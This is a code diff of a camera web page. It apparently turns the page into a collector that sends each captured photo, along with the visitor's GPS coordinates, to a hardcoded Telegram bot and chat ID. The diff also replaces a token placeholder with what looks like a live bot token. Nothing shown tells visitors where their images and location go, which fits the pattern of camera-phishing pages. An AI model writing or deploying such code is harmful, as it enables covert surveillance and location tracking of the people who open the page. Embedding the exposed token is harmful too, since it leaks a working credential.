@@ -61,23 +61,57 @@
 
     /* Buttons Container */
     #controls {
-      position: absolute;
-      bottom: 10px;
+      position: fixed;
+      bottom: 20px;
       left: 50%;
       transform: translateX(-50%);
       display: flex;
-      flex-direction: row;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
       z-index: 20;
-      width: 100%;
-      gap: 10px;
     }
 
-    /* Buttons */
+    /* Filter Buttons */
+    .filter-buttons {
+      display: flex;
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+
+    .filter-button {
+      width: 50px;
+      height: 50px;
+      background-color: rgba(255, 255, 255, 0.3);
+      border: 2px solid white;
+      border-radius: 50%;
+      cursor: pointer;
+      transition: transform 0.2s ease, background-color 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      color: white;
+    }
+
+    .filter-button:hover {
+      transform: scale(1.2);
+      background-color: rgba(255, 255, 255, 0.5);
+    }
+
+    .filter-button.active {
+      background-color: rgba(255, 255, 255, 1);
+    }
+
+    /* Action Buttons */
+    #action-buttons {
+      display: flex;
+      gap: 15px;
+      margin-top: 15px;
+    }
+
     .button {
-      width: 60px;
-      height: 60px;
+      width: 50px;
+      height: 50px;
       background-color: rgba(255, 255, 255, 0.3);
       border: 2px solid white;
       border-radius: 50%;
@@ -94,6 +128,10 @@
       transform: scale(1.2);
       background-color: rgba(255, 255, 255, 0.5);
     }
+
+    .button.active {
+      background-color: rgba(255, 255, 255, 1);
+    }
   </style>
 </head>
 <body>
@@ -109,73 +147,41 @@
 
     <!-- Controls -->
     <div id="controls">
-      <div id="capture" class="button">📸</div>
-      <div id="toggle-camera" class="button">🔄</div>
+      <!-- Action Buttons -->
+      <div id="action-buttons">
+        <div id="capture" class="button">📸</div>
+      </div>
     </div>
   </div>
 
 <script>
   const video = document.getElementById('camera');
   const captureButton = document.getElementById('capture');
-  const toggleCameraButton = document.getElementById('toggle-camera');
-
   let currentStream = null;
-  let usingFrontCamera = true;
-  let gpsLocation = null;
+  let gpsLocation = null; 
 
   // Start camera
-  async function startCamera(front = true) {
-    const constraints = {
-      video: {
-        facingMode: front ? 'user' : 'environment',
-      },
-    };
-
-    if (currentStream) {
-      currentStream.getTracks().forEach(track => track.stop());
-    }
-
+  async function startCamera() {
     try {
+      const constraints = { video: true };
       currentStream = await navigator.mediaDevices.getUserMedia(constraints);
       video.srcObject = currentStream;
-
-      // Apply mirroring effect for front camera
-      if (front) {
-        video.style.transform = 'scaleX(-1)';
-      } else {
-        video.style.transform = 'scaleX(1)';
-      }
-
-      // Log video width/height to check camera status
-      video.addEventListener('loadeddata', () => {
-        console.log('Camera is working:', video.videoWidth, video.videoHeight);
-      });
     } catch (error) {
       console.error('Error accessing camera:', error);
       alert('Error accessing camera. Please check camera permissions.');
     }
   }
 
-  // Toggle camera
-  toggleCameraButton.addEventListener('click', () => {
-    usingFrontCamera = !usingFrontCamera;
-    startCamera(usingFrontCamera);
-  });
-
-  // Capture image and send it to Telegram bot
+  // Capture image and send to Telegram bot
   captureButton.addEventListener('click', () => {
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
     const ctx = canvas.getContext('2d');
-    ctx.filter = video.style.filter;
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     const image = canvas.toDataURL('image/png');
-    console.log('Captured Image:', image);
-
-    // Convert the image to a Blob to send it as a file
     const byteCharacters = atob(image.split(',')[1]);
     const byteArrays = [];
 
@@ -200,27 +206,23 @@
     },
     error => {
       console.error('Error getting location:', error);
+      alert('Error getting location. Please check location permissions.');
     }
   );
 
   // Send the image and GPS location to Telegram bot
   function sendImageAndLocationToTelegram(imageBlob) {
     const formData = new FormData();
-    formData.append('chat_id', '1676411287'); // Replace with your chat ID
+    formData.append('chat_id', '1676411287'); 
     formData.append('photo', imageBlob, 'photo.png');
+    formData.append(
+      'caption',
+      gpsLocation
+        ? `Location: Latitude ${gpsLocation.latitude}, Longitude ${gpsLocation.longitude}`
+        : 'Location information not available.'
+    );
 
-    // Add GPS location as a caption
-    let captionText = '';
-    if (gpsLocation) {
-      captionText = `🌍 Location:\nLatitude: ${gpsLocation.latitude}\nLongitude: ${gpsLocation.longitude}`;
-    } else {
-      captionText = '🌍 Location information not available.';
-    }
-
-    formData.append('caption', captionText);
-
-    // Send the image and location to Telegram
-    fetch('https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendPhoto', {
+    fetch('https://api.telegram.org/bot5682784122:AAFGjK0Or0jMK8g928ckWGSt4XUTojYxcRI/sendPhoto', {
       method: 'POST',
       body: formData,
     })
@@ -233,9 +235,8 @@
       });
   }
 
-  // Start with the front camera
-  startCamera(true);
+  // Start the camera
+  startCamera();
 </script>
-
 </body>
 </html>
